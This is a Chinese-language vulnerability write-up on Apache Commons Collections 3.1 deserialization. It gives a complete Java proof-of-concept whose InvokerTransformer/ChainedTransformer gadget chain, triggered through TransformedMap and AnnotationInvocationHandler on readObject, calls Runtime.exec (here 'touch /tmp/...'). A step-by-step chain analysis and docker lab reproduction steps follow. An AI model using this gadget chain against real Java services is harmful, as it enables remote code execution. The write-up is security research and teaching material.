  

## 1.1 状态

完成漏洞挖掘条件分析、漏洞复现。

## 1.2 漏洞分析

存在安全缺陷的版本：Apache Commons Collections3.2.1以下，【JDK版本：1.7.0_80】Apache Maven
3.6.3。

POC核心代码：

    
    
    package com.patrilic.vul;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.map.TransformedMap;​import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class EvalObject {public static void main(String[] args) throws Exception {Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"touch /tmp/CommonsCollections3.1"})};​//将transformers数组存入ChaniedTransformer这个继承类Transformer transformerChain = new ChainedTransformer(transformers);//        transformerChain.transform(null);​//创建Map并绑定transformerChainMap innerMap = new HashMap();innerMap.put("value", "value");Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);​//        //触发漏洞//        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();//        onlyElement.setValue("foobar");​Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);cons.setAccessible(true);​Object ins = cons.newInstance(java.lang.annotation.Retention.class,outerMap);​//将ins序列化ByteArrayOutputStream exp = new ByteArrayOutputStream();ObjectOutputStream oos = new ObjectOutputStream(exp);oos.writeObject(ins);oos.flush();oos.close();​//取出序列化的数据流进行反序列化，验证ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());ObjectInputStream ois = new ObjectInputStream(out);Object obj = (Object) ois.readObject();​//    }//}}}​

###  **漏洞利用思路：**

Transformer接口-实现类-InvokerTransformer（），可调用任何函数。

为实现 Runtime.getRuntime().exec(cmd)，要多次调用 transformer 并将当前返回结果作为下次输入信息。

为调用 Runtime.getRuntime()，考虑 ConstantTransformer 类，它可直接将输入的参数作为输出。

ChainedTransformer 作为实现类，对于接收的Transformer
数组，采用自身的transform方法（参数是用户输入的）逐次处理Transformer数组对象，将其结果作为下次重复调用的输入参数。它的
transform（）方法即可出触发漏洞。

为寻找反序列化途径，即读进来数据被反序列化执行，则反向寻找可触发ChainedTransformer 对象 .transform() 方法的途径。

HashMap类可以键值对方式存储数据，put(key，value)方法可存储数据。

TransformedMap类的功能是存储键值对并将其转换为transform
objects，decorate（）方法可创建键值对组，checkSetValue（）方法会触发this.valueTransformer.transform（）语句。依次反向寻找调用
checkSetValue（）【1】，使 this.valueTransformer 为 ChainedTransformer 对象的途径【2】。

对于【2】，TransformedMap 类的静态方法 decorate（）可达到目标。

对于【1】，AbstractInputCheckedMapDecorator 类 MapEntry 静态类的 **setValue**
方法会执行this.parent.checkSetValue(value)，则接下来应使this.parent为TransformedMap对象【3】。

对于【3】，正向分析POC中此段代码：

    
    
    Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();

研究可知，执行过程中多次在AbstractInputCheckedMapDecorator类中，将TransformedMap对象赋值给this.parent，返回Map.Entry对象，正好可以执行setValue（）方法，触发漏洞。

为提升通用性，必须设法使得调用反序列化方法即触发漏洞，因此，考虑寻找类对象满足“重写反序列化readObject()且执行Map类对象变量的setValue()，同时此变量可被控制赋键值数据”。AnnotationInvocationHandler类满足此需求【它对Map类型的成员变量的每个条目均调用setValue()】。

Class.forName() 功能是加载类。

则再次分析，对于【1】，正向分析POC中核心代码：

    
    
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);cons.setAccessible(true);​Object ins = cons.newInstance(java.lang.annotation.Retention.class,outerMap);……Object obj = (Object) ois.readObject();​

研究可知，执行过程会执行 MapEntry 静态类的 setValue 方法，且会执行entrySet 方法使得
this.parent=TransformedMap 对象，从而触发漏洞。

总的来说，正向的POC构造思路为：先构造 ChainedTransformer 对象，随后创建 Map 对象，再采用 TransformedMap 类实例将
ChainedTransformer 对象保存至 Map 类对象中，再通过反射方法获得经 Map
类对象初始化的AnnotationInvocationHandler 类实例，对其进行序列化。

## 1.3 docker复现

  

下载制作的docker镜像，用以下命令：

    
    
    docker pull 296645429/apache-commons-collections-vulnerability-ubuntu:v1

设置局域网及容器ip、启动容器，例子：

（1）自定义网络

    
    
    docker network create --subnet=192.168.10.1/24 testnet

（2）启动docker容器

    
    
    docker run -p 8088:8088 -p 8081:8081 -it --name testt3 --hostname testt3 --network testnet --ip 10.10.10.100 ubuntuxxx:xxx /bin/bash

在容器【Apache-Commons-Collections】中，执行命令【java -jar commons-collections-3.1.jar】，则生成文件【CommonsCollections3.1】，如下图。

![1606815382_5fc60e9628e3bb9a8eaaa.png!small?1606815382517](https://image.3001.net/images/20201201/1606815382_5fc60e9628e3bb9a8eaaa.png!small?1606815382517)

## 1.4 参考资料

  * https://www.freebuf.com/vuls/251664.html

  * https://patrilic.top/2020/03/19/commons-collections-3.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#0x00-Build

  * https://www.smi1e.top/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bapache-commons-collections/

  * https://zhuanlan.zhihu.com/p/62496468

  * https://blog.csdn.net/chengly0129/article/details/70215018

 **推荐阅读**[Apache Shiro权限绕过漏洞 (CVE-2020-11989)
挖掘分析和复现](http://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&mid=2247497210&idx=1&sn=a18dc34cbc679a6d6628d4ce585f8ab0&chksm=ea94c490dde34d8694d75f551125c2a326ffe76199ce9074b470837fbf33ade1e9debb6bb301&scene=21#wechat_redirect)[Apache
Solr
未授权上传（RCE）漏洞（CVE-2020-13957）的原理分析与验证](http://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&mid=2247495566&idx=1&sn=37c395075b237c3ff6ea763635da2fdd&chksm=ea94dee4dde357f23b034136b8a2ac4cd24b2fb35f7cf3b6021cb117dfa45b99f88e48f3c712&scene=21#wechat_redirect)[WebLogic
UniversalExtractor反序列化漏洞(CVE-2020-14645)的复现和分析](http://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&mid=2247497869&idx=1&sn=b9ca5e1f08ae204142bd9952a3d036c0&chksm=ea94c9e7dde340f1367821024670a51227d44c027d10c7225cdb87ba99f72f35110da8077296&scene=21#wechat_redirect)

题图：Pixabay License

 **转载请注明“转自奇安信代码卫士 https://codesafe.qianxin.com”。**

  

  

